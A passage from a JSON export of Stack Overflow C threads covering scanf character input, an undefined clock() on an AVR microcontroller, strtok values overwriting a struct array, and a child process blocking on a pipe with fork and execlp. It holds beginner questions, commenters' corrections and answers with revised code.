{a[I+1] = '\\0'}</code> is not valid. Even if it compiles, it is going out of bounds when assigning the <code>'\\0'</code> character.  The commonly used convention looks more like this instead:</p>\n\n<pre><code>char a[I+1] = {0};\n</code></pre>\n\n<p>Or simply:</p>\n\n<pre><code>char a[I+1] = {};\n</code></pre>\n\n<p>That said, <code>q</code> is only 1 <code>char</code> in size, but your <code>scanf()</code> is trying to read a string up to 127 <code>char</code>s into <code>q</code>.  So you are going to trash memory.  To read a single <code>char</code> at a time, use <code>%c</code> instead:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n#define MAX_INPUT 5\n\nint main (void) {\n\n    char a[MAX_INPUT+1];\n    int i, len;\n\n    for(i = 0; i &lt; MAX_INPUT; i++) {\n        printf(\"Enter an alphabet:\\t\");\n        scanf(\"%c\", &amp;a[i]);\n    }\n    a[MAX_INPUT] = '\\0';\n\n    printf(\"\\n\");\n\n    len = strlen(a);\n    for(i = 0; i &lt; len; i++)  {\n        printf(\"Element a[%d]:\\t%c\\n\", i, a[i]);\n    }\n\n    printf(\"And the a string:\\t%s\\n\", a);\n\n    return 0;\n}\n</code></pre>\n\n<p>Or, you can remove the loop and just use a single call to <code>scanf()</code> using <code>\"%5[^\\n]\"</code> as the format string:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n#define MAX_INPUT 5\n\nint main (void) {\n\n    char a[MAX_INPUT+1];\n    char fmt[20];\n    int i, len;\n\n    sprintf(fmt, \"%%%d[^\\n]\", MAX_INPUT);\n\n    printf(\"Enter an alphabet:\\t\");\n    scanf(fmt, a);\n\n    printf(\"\\n\");\n\n    len = strlen(a);\n    for(i = 0; i &lt; len; i++)  {\n        printf(\"Element a[%d]:\\t%c\\n\", i, a[i]);\n    }\n\n    printf(\"And the a string:\\t%s\\n\", a);\n\n    return 0;\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1544651952, "post_id": 53749632, "comment_id": 94356735, "body": "That&#39;s curious.  I saved the code above into a file <code>ok59.c</code>.  Compiling it on a Mac with GCC 7.3.0 (<code>&#47;opt&#47;gcc&#47;v7.3.0&#47;bin&#47;gcc -O3   -g  -std=c11 -Wall  -Werror ok59.c -o ok59</code>, I get the message: <code>ok59.c: In function \u2018main\u2019: ok59.c:5:21: error: array subscript is above array bounds [-Werror=array-bounds]</code> pointing at <code>char a[I+1] = {a[I+1] = &#39;\\0&#39;},q;</code>.  Granted, this is not Cygwin, but\u2026I get the message with <code>-std=c90</code> too.  (Not my DV.)"}, {"owner": {"reputation": 1, "user_id": 10778364, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d5c2e4d2761583d762cdc8038425dcca?s=128&d=identicon&r=PG&f=1", "display_name": "Caan", "link": "https://stackoverflow.com/users/10778364/caan"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1544675317, "post_id": 53749632, "comment_id": 94362586, "body": "@JonathanLeffler, I&#39;ve tried the same flags as in your comment and it compiled without any warning or error. Any idea why the response is different when code and flags are the same?"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1544675683, "post_id": 53749632, "comment_id": 94362652, "body": "Frankly, no \u2014 I&#39;m surprised."}], "tags": [], "owner": {"reputation": 1, "user_id": 10778364, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d5c2e4d2761583d762cdc8038425dcca?s=128&d=identicon&r=PG&f=1", "display_name": "Caan", "link": "https://stackoverflow.com/users/10778364/caan"}, "is_accepted": false, "score": -1, "last_activity_date": 1544641010, "creation_date": 1544641010, "answer_id": 53749632, "question_id": 53735082, "link": "https://stackoverflow.com/questions/53735082/character-array-user-input-scanf/53749632#53749632", "title": "Character Array User Input Scanf", "body": "<p>This works without any warning or error on Cygwin gcc v7.3 with Wall flag:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#define I 5\n\nint main (void) {\n    char a[I+1] = {a[I+1] = '\\0'},q;\n    int i;\n\n    for(i = 0; i &lt; I; i++) {\n        printf(\"Enter an alphabet:\\t\");\n        scanf(\"%c%*c\", &amp;q);\n        a[i] = q;\n    }\n\n    printf(\"\\n\");\n\n    for(i = 0; i &lt; I; i++)  {\n        printf(\"Element a[%d] of a[I]:\\t%c\\n\", i, a[i]);\n    }\n\n    printf(\"And the string a[I]:\\t%s\\n\", a);\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 10778364, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d5c2e4d2761583d762cdc8038425dcca?s=128&d=identicon&r=PG&f=1", "display_name": "Caan", "link": "https://stackoverflow.com/users/10778364/caan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 79, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1544641010, "creation_date": 1544580524, "question_id": 53735082, "link": "https://stackoverflow.com/questions/53735082/character-array-user-input-scanf", "title": "Character Array User Input Scanf", "body": "<p>Just started learning programming on my own and whilst trying to create an array of characters from user input, using scanf, have hit the wall; the code is as below:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#define I 5\n\nint main (void) {\n\n    char a[I+1] = {a[I+1] = '\\0'}, q;\n    int i;\n\n    for(i = 0; i &lt; I; i++) {\n        printf(\"Enter an alphabet:\\t\");\n        //scanf(\"%c\", &amp;q);\n        //scanf(\"%c*\\n\", &amp;q);\n        //scanf(\"%[^\\n]\", &amp;q);\n        //scanf(\"%[a-z, A-Z]\", &amp;q);\n        scanf(\"%127[^\\n]\", &amp;q);\n        a[i] = q;\n    }\n\n    printf(\"\\n\");\n\n    for(i = 0; i &lt; I; i++)  {\n        printf(\"Element a[%d] of a[I]:\\t%c\\n\", i, a[i]);\n    }\n\n    printf(\"And the a[I] string:\\t%s\\n\", a);\n\n    return 0;\n}\n</code></pre>\n\n<p>None of the scanf combinations in the above code works: the program either skips input prompt after the first one or does not store response.</p>\n\n<p>How can this be resolved with scanf?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 1, "creation_date": 1544579489, "post_id": 53734909, "comment_id": 94323345, "body": "Please post a MCVE. Are there any other compiler messages?"}, {"owner": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "edited": false, "score": 1, "creation_date": 1544580320, "post_id": 53734909, "comment_id": 94323497, "body": "Is this a freestanding embedded environment that might not have support for all of the standard C library?"}, {"owner": {"reputation": 21, "user_id": 10625675, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Stephen Lam", "link": "https://stackoverflow.com/users/10625675/stephen-lam"}, "reply_to_user": {"reputation": 117699, "user_id": 62576, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/15264f7bf48e10ce32dfa4865a13763c?s=128&d=identicon&r=PG", "display_name": "Ken White", "link": "https://stackoverflow.com/users/62576/ken-white"}, "edited": false, "score": 0, "creation_date": 1544580848, "post_id": 53734909, "comment_id": 94323607, "body": "I have added the full code for reference. There are no other compiler messages at this point, just this specific issue.  I believe AtmelStudio supports time.h clock(). I haven&#39;t seen anything to suggest otherwise.  @KenWhite thanks for the link, it&#39;s a lot to go through but I&#39;m reading through it to see if any of it helps me."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1544582307, "post_id": 53734909, "comment_id": 94323898, "body": "regarding: <code>void main() {</code>  There are only two valid signatures for <code>main()</code> they are: <code>int main( void )</code> and <code>int main( int argc, char *argv[] )</code>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1544582785, "post_id": 53734909, "comment_id": 94323983, "body": "regarding: <code>DDRB |= (0&lt;&lt;DDB0);</code>  This probably should be: <code>DDRB &amp;= ~(0&lt;&lt;DDB0);</code>"}], "answers": [{"tags": [], "owner": {"reputation": 21, "user_id": 10625675, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Stephen Lam", "link": "https://stackoverflow.com/users/10625675/stephen-lam"}, "is_accepted": false, "score": 1, "last_activity_date": 1544581465, "creation_date": 1544581465, "answer_id": 53735198, "question_id": 53734909, "link": "https://stackoverflow.com/questions/53734909/c-undefined-reference-to-clock/53735198#53735198", "title": "C: Undefined reference to &#39;clock()&#39;", "body": "<p>@Shawn had it right....I dove into the time.h library code available to me and apparently:</p>\n\n<blockquote>\n  <p>Section 7.23.2.1 clock()\n      The type clock_t, the macro CLOCKS_PER_SEC, and the function clock() are not implemented. We\n      consider these items belong to operating system code, or to application code when no operating\n      system is present.</p>\n</blockquote>\n\n<p>So I guess that's a lesson for me. Thanks for the help.</p>\n"}], "owner": {"reputation": 21, "user_id": 10625675, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Stephen Lam", "link": "https://stackoverflow.com/users/10625675/stephen-lam"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1119, "favorite_count": 0, "closed_date": 1544591330, "answer_count": 1, "score": 0, "last_activity_date": 1544581465, "creation_date": 1544578931, "last_edit_date": 1544580808, "question_id": 53734909, "link": "https://stackoverflow.com/questions/53734909/c-undefined-reference-to-clock", "closed_reason": "Duplicate", "title": "C: Undefined reference to &#39;clock()&#39;", "body": "<p>I'm not really that familiar with C so please bear with me...</p>\n\n<p>I'm writing some simple code for a watchdog timer on an Atmel Tiny 85, developing in AtmelStudio. I want to access the clock() function of the time.h library:</p>\n\n<pre><code>#include &lt;time.h&gt;\n\n.....\n\nvoid main() {\n  clock_t start = clock();\n  ....\n}\n</code></pre>\n\n<p>Unfortunately the compiler complains that clock is an undefined reference. Every code example I have looked up on the web seems to be doing what I am doing. Is there some fundamental thing I am missing? Thanks!</p>\n\n<p>Here is the full code:</p>\n\n<pre><code>#define F_CPU 1000000UL // 1 MHz\n#include &lt;avr/io.h&gt;\n#include &lt;util/delay.h&gt;\n#include &lt;avr/interrupt.h&gt;\n#include &lt;time.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;avr/wdt.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;util/atomic.h&gt;\n\n#define LED_PORT PB1\n#define RST0_PORT PINB3\n#define RST1_PORT PINB4\n#define HEARTBEAT PINB0\n\nvolatile int HEARTBEAT_RECEIVED;\n#define CLOCKS_PER_SECOND 1000000;\nconst int TIMEOUT_PERIOD = 120; //reset raspberry pi after this many seconds\n\nvoid set_output();\nvoid set_input();\nvoid set_interrupts();\nvoid run_timer(clock_t start);\nvoid restart_raspberry_pi();\n\nint main(void)\n{\n    clock_t start;\n\n    HEARTBEAT_RECEIVED = false;\n\n    //Configure IO pins\n    set_output();\n    set_input();\n    PORTB &amp;= ~(1 &lt;&lt; RST0_PORT); // Set pin low (common ground pin for pi reset)\n    PORTB &amp;= ~(1 &lt;&lt; RST1_PORT); // Set pin low (initialize for no pi reset)\n\n    //Configure and enable interrupts\n    set_interrupts();\n\n    while (1) {\n        sei();\n        start = clock();\n        run_timer(start);\n    }\n\n    return (0);\n}\n\n\nvoid run_timer(clock_t start) {\n\n    double time_elapsed;\n\n    do {\n        _delay_ms(1000);\n\n        if (HEARTBEAT_RECEIVED) { //If heartbeat detected, reset timer.\n            HEARTBEAT_RECEIVED = false;\n            return;\n        }\n\n        time_elapsed = ( clock() - start ) / CLOCKS_PER_SECOND;\n    } while (time_elapsed &lt; TIMEOUT_PERIOD);\n\n    restart_raspberry_pi(); //Timeout period has elapsed, reset the pi\n}\n\nISR(PCINT0_vect) {\n    //Indicate that a heartbeat has been received\n    HEARTBEAT_RECEIVED = true;\n}\n\nvoid restart_raspberry_pi() {\n    cli();\n\n    PORTB |= (1 &lt;&lt; RST1_PORT); // Set pin high (sets RUN high to reset)\n    _delay_ms(500);\n    PORTB &amp;= ~(1 &lt;&lt; RST1_PORT); // Set pin low (release reset control)\n}\n\nvoid set_output()\n{\n    //The DDxn bit in the DDRx Register selects the direction of this pin.\n    //If DDxn is written logic one, Pxn is configured as an output pin.\n    //If DDxn is written logic zero, Pxn is configured as an input pin.\n\n    //PORTB = (0&lt;&lt;PB0) | (1&lt;&lt;PB3);\n    DDRB = (1&lt;&lt;DDB5) | (1&lt;&lt;DDB4) | (1&lt;&lt;DDB3) | (1&lt;&lt;DDB2) | (1&lt;&lt;DDB1); // Set pins as output.\n}\n\nvoid set_input()\n{\n    DDRB |= (0&lt;&lt;DDB0); // set pin 0 as input. Added |=.\n}\n\nvoid set_interrupts()\n{\n    GIMSK |= (1 &lt;&lt; PCIE);   // pin change interrupt enable\n    PCMSK |= (1 &lt;&lt; PCINT0); // pin change interrupt enabled for PCINT0\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 1619, "user_id": 7864413, "user_type": "registered", "profile_image": "https://graph.facebook.com/10208517922736756/picture?type=large", "display_name": "Phil M", "link": "https://stackoverflow.com/users/7864413/phil-m"}, "edited": false, "score": 0, "creation_date": 1544579173, "post_id": 53734908, "comment_id": 94323265, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/11876772/returning-address-of-local-variable\">returning address of local variable</a>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1544583168, "post_id": 53734908, "comment_id": 94324047, "body": "regarding: <code>char* tempWord = malloc(sizeof(char) * strlen(tok));</code>  1) the expression: <code>sizeof( char )</code> is defined in the C standard as 1.  Multiplying anything by 1 has no effect.  Suggest removing that expression.  2) always check (!=NULL) the returned value to assure the operation was successful"}], "answers": [{"tags": [], "owner": {"reputation": 2137, "user_id": 1212725, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/152c2f757fe98760a1cca54a21f63a31?s=128&d=identicon&r=PG", "display_name": "bruceg", "link": "https://stackoverflow.com/users/1212725/bruceg"}, "is_accepted": true, "score": 1, "last_activity_date": 1544579961, "creation_date": 1544579961, "answer_id": 53735013, "question_id": 53734908, "link": "https://stackoverflow.com/questions/53734908/c-last-element-in-array-overwrites-all-previous-items/53735013#53735013", "title": "C: Last element in array overwrites all previous items", "body": "<p>I think you're pretty close.  The big problem is that the value of temp and tempword aren't what you want to assign.  Most likely they won't change, but their contents will.  Also, you're using double pointers for your variables when you shouldn't need to do that.  I would change your code to be like this:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n\ntypedef struct textBit\n{\n    int textID;\n    char* theWord;\n    int randInt;\n} TextBit;\n\nvoid printTextBit(TextBit bit);\n\nint main()\n{\n    int counter = 0;\n    char myText[] = \"hello this is a bunch of text i am just writing for an example to test something\";\n    TextBit* textBits;\n    textBits = malloc(sizeof(TextBit) * 16);\n\n    char* tok = strtok(myText, \" \");\n    while(tok != NULL)\n    {\n        TextBit *temp;\n        temp = &amp;textBits[counter];\n        temp-&gt;textID = counter;\n        temp-&gt;randInt = 25;\n        temp-&gt;theWord = strdup(tok);\n\n        printf(\"%d %s\\n\", counter, tok);\n        //printTextBit(temp);\n\n        counter++;\n        tok = strtok(NULL, \" \");\n    }\n\n    for(int i = 0; i &lt; counter; i++) {\n        printTextBit(textBits[i]);\n    }\n}\n\nvoid printTextBit(TextBit bit)\n{\n    printf(\"TextBit: %s (#%d) - %d\\n\", bit.theWord, bit.textID, bit.randInt);\n}\n</code></pre>\n\n<p>Using strdup will copy the word over to your struct.  You could use malloc and strcpy separately, but strdup does both in one line.  Also, this code uses <code>temp</code> to point into the textBits array.</p>\n"}, {"tags": [], "owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "is_accepted": false, "score": 1, "last_activity_date": 1544583353, "creation_date": 1544583353, "answer_id": 53735405, "question_id": 53734908, "link": "https://stackoverflow.com/questions/53734908/c-last-element-in-array-overwrites-all-previous-items/53735405#53735405", "title": "C: Last element in array overwrites all previous items", "body": "<p>the main problem is all the entries are using the same address as <code>tok</code> points to.  Suggest when adding a word to the array, to use: <code>strdup()</code> (and of course, check the result for !=NULL to assure the operation was successful) then assigned that returned value to the array</p>\n"}], "owner": {"reputation": 47, "user_id": 2741548, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aceffc2f6943b49a269dd64ef8bd7b31?s=128&d=identicon&r=PG&f=1", "display_name": "MarkA2049", "link": "https://stackoverflow.com/users/2741548/marka2049"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 98, "favorite_count": 0, "accepted_answer_id": 53735013, "answer_count": 2, "score": 0, "last_activity_date": 1544583353, "creation_date": 1544578914, "question_id": 53734908, "link": "https://stackoverflow.com/questions/53734908/c-last-element-in-array-overwrites-all-previous-items", "title": "C: Last element in array overwrites all previous items", "body": "<p>Firstly, I apologize if this is a duplicate of some other question. I have spent several hours now playing around and attempting to figure out my problem. I may not have been searching with the correct terms as I am a novice with C.</p>\n\n<hr>\n\n<p>I need to split up text using <code>strtok</code> and store each value into a struct and store that struct in an array. I need the array's space to be dynamically allocated memory using <code>malloc</code> / <code>realloc</code>.</p>\n\n<p>The problem I am facing is that the last value I set is overwriting all previous values in my array. I am completely lost at this point. I have included a short example of my problem below.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n\ntypedef struct textBit\n{\n    int textID;\n    char** theWord;\n    int randInt;\n} TextBit;\n\nvoid printTextBit(TextBit bit);\n\nint main()\n{\n    int counter = 0;\n    char myText[] = \"hello this is a bunch of text i am just writing for an example to test something\";\n    TextBit** textBits;\n    textBits = malloc(sizeof(TextBit) * 16);\n\n    char* tok = strtok(myText, \" \");\n    while(tok != NULL)\n    {\n        TextBit temp;\n        temp.textID = counter;\n        temp.randInt = 25;\n\n        char* tempWord = malloc(sizeof(char) * strlen(tok));\n        strcpy(tempWord, tok);\n        temp.theWord = &amp;tempWord;\n\n        printf(\"%d %s\\n\", counter, tok);\n        //printTextBit(temp);\n\n        textBits[counter] = &amp;temp;\n\n        counter++;\n        tok = strtok(NULL, \" \");\n    }\n\n    for(int i = 0; i &lt; counter; i++)\n    {\n        printTextBit(*textBits[i]);\n    }\n}\n\nvoid printTextBit(TextBit bit)\n{\n    printf(\"TextBit: %s (#%d) - %d\\n\", *bit.theWord, bit.textID, bit.randInt);\n}\n</code></pre>\n\n<p>This code outputs:</p>\n\n<pre><code>0 hello\n1 this\n2 is\n3 a\n4 bunch\n5 of\n6 text\n7 i\n8 am\n9 just\n10 writing\n11 for\n12 an\n13 example\n14 to\n15 test\n16 something\nTextBit: something (#16) - 25\nTextBit: something (#16) - 25\nTextBit: something (#16) - 25\nTextBit: something (#16) - 25\nTextBit: something (#16) - 25\nTextBit: something (#16) - 25\nTextBit: something (#16) - 25\nTextBit: something (#16) - 25\nTextBit: something (#16) - 25\nTextBit: something (#16) - 25\nTextBit: something (#16) - 25\nTextBit: something (#16) - 25\nTextBit: something (#16) - 25\nTextBit: something (#16) - 25\nTextBit: something (#16) - 25\nTextBit: something (#16) - 25\nTextBit: something (#16) - 25\n</code></pre>\n"}, {"tags": ["c", "pipe", "fork", "low-level"], "comments": [{"owner": {"reputation": 818, "user_id": 1360035, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/18e613e39941e0b1114c2b94c3195df8?s=128&d=identicon&r=PG", "display_name": "moilejter", "link": "https://stackoverflow.com/users/1360035/moilejter"}, "edited": false, "score": 2, "creation_date": 1544579033, "post_id": 53734902, "comment_id": 94323238, "body": "child and parent will execute in parallel, so child will block on read until a little bit later, when parent has had a chance to execute for a bit and put some data into the pipe..."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1544584058, "post_id": 53734902, "comment_id": 94324228, "body": "for ease of readability and understanding:  1) consistently indent the code.  indent after every opening brace &#39;{&#39;.  unindent before every closing brace &#39;}&#39;.  Suggest each indent level be 4 spaces.  2) follow the axiom:  <i>one one statement per line and (at most) one variable declaration per statement.</i>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1544584157, "post_id": 53734902, "comment_id": 94324244, "body": "the function: <code>fork()</code> has three kinds of returns  1) &lt;0 means an error occurred 2) == 0 means the child process is executing  3) &gt;0 means the parent process is executing.  The code needs to check for all three kinds of returns"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1544584237, "post_id": 53734902, "comment_id": 94324266, "body": "regarding: <code>execlp(&quot;rev&quot;, &quot;rev&quot;, 0); }</code>  If this statement returns, it means an error occurred. so the statement should be followed by: <code>perror( &quot;execlp failed&quot; );  exit( EXIT_FAILURE );</code>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1544584330, "post_id": 53734902, "comment_id": 94324279, "body": "regarding: <code>pipe (fds);</code>  always check the returned value to assure the operation was successful."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1544584500, "post_id": 53734902, "comment_id": 94324314, "body": "regarding: <code>&#47;* Connect the read end of the pipe to standard input. *&#47; \t\tdup2 (fds[0], STDIN_FILENO);</code>  This will have no effect on the execution of the program: <code>rev</code>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1544584779, "post_id": 53734902, "comment_id": 94324360, "body": "regarding: <code>execlp(&quot;rev&quot;, &quot;rev&quot;, 0); }</code>  The last parameter should be a pointer, not an integer.  suggest <code>execlp(&quot;rev&quot;, &quot;rev&quot;, NULL); }</code>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1544584860, "post_id": 53734902, "comment_id": 94324381, "body": "regarding: <code>fflush (stream);</code>  Since the last call to <code>fprintf()</code> format string ends in &#39;\\n&#39;, There is no need for this statement"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1544584944, "post_id": 53734902, "comment_id": 94324397, "body": "You might want to make your code much simpler by learning about the functions: <code>popen()</code> and `pclose()"}], "answers": [{"tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": true, "score": 3, "last_activity_date": 1544594262, "creation_date": 1544594262, "answer_id": 53736887, "question_id": 53734902, "link": "https://stackoverflow.com/questions/53734902/why-child-process-is-waiting-while-using-fork-and-pipes-for-stdin-from-parents/53736887#53736887", "title": "Why child process is waiting while using fork and pipes for stdin from parent&#39;s output?", "body": "<p>You aren't closing enough file descriptors in the child.</p>\n\n<p><strong>Rule of thumb</strong>: If you\n<a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/dup2.html\" rel=\"nofollow noreferrer\"><code>dup2()</code></a>\none end of a pipe to standard input or standard output, close both of the\noriginal file descriptors returned by\n<a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/pipe.html\" rel=\"nofollow noreferrer\"><code>pipe()</code></a>\nas soon as possible.\nIn particular, you should close them before using any of the\n<a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/execvp.html\" rel=\"nofollow noreferrer\"><code>exec*()</code></a>\nfamily of functions.</p>\n\n<p>The rule also applies if you duplicate the descriptors with either\n<a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/dup.html\" rel=\"nofollow noreferrer\"><code>dup()</code></a>\nor\n<a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/fcntl.html\" rel=\"nofollow noreferrer\"><code>fcntl()</code></a>\nwith <code>F_DUPFD</code></p>\n\n<p>In this case, the child needs to close <code>fds[1]</code> after duplicating it.  Because it is still open, <code>rev</code> will never receive EOF because there is a process (the <code>rev</code> child process) that could, in theory, write to the input.</p>\n\n<p>You should use <code>fclose(stream)</code> instead of <code>close(fds[1])</code> because the output is buffered and <code>fclose()</code> knows to flush the buffers, but <code>close()</code> hasn't got a clue.  However, by using <code>fflush(stream)</code> before the misguided <code>close()</code>, you do avoid problems.</p>\n\n<p>That leads to:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(void)\n{\n    int fds[2];\n    pid_t pid;\n\n    pipe(fds);\n\n    pid = fork();\n    if (pid == (pid_t)0)\n    {\n        close(fds[1]);\n        dup2(fds[0], STDIN_FILENO);\n        close(fds[1]);\n        execlp(\"rev\", \"rev\", 0);\n    }\n    else\n    {\n        FILE *stream;\n        close(fds[0]);\n        stream = fdopen(fds[1], \"w\");\n        fprintf(stream, \",ereh ot ereht morF\\n\");\n        fprintf(stream, \",ereht ot ereh dna\\n\");\n        fprintf(stream, \".erehwyreve era sgniht ynnuf\\n\");\n        fprintf(stream, \"ssueS .rD - \\n\");\n        fclose(stream);\n        waitpid(pid, NULL, 0);\n    }\n    return 0;\n}\n</code></pre>\n\n<p>which produces the output:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>From there to here,\nand here to there,\nfunny things are everywhere.\n - Dr. Seuss\n</code></pre>\n"}], "owner": {"reputation": 189, "user_id": 6407689, "user_type": "registered", "accept_rate": 80, "profile_image": "https://lh6.googleusercontent.com/-TLtMfXFWaak/AAAAAAAAAAI/AAAAAAAACBY/aY9k7VRDmt4/photo.jpg?sz=128", "display_name": "koneru nikhil", "link": "https://stackoverflow.com/users/6407689/koneru-nikhil"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 253, "favorite_count": 0, "accepted_answer_id": 53736887, "answer_count": 1, "score": 0, "last_activity_date": 1544628593, "creation_date": 1544578869, "last_edit_date": 1544628593, "question_id": 53734902, "link": "https://stackoverflow.com/questions/53734902/why-child-process-is-waiting-while-using-fork-and-pipes-for-stdin-from-parents", "title": "Why child process is waiting while using fork and pipes for stdin from parent&#39;s output?", "body": "<p>I understood how fork and pipes work but i have a doubt regarding the flow of the child and parent process.Since we are using fork the order of execution of parent and child process is undefined but why child process is waiting for stdin from parent process.What happens if child process executes first? it must print empty in console? but it is not happening can i know why?</p>\n\n<pre><code>#include &lt;stdio.h&gt; \n#include &lt;sys/types.h&gt; \n#include &lt;sys/wait.h&gt; \n#include &lt;unistd.h&gt;\nint main () {\nint fds[2]; pid_t pid;\n/* File 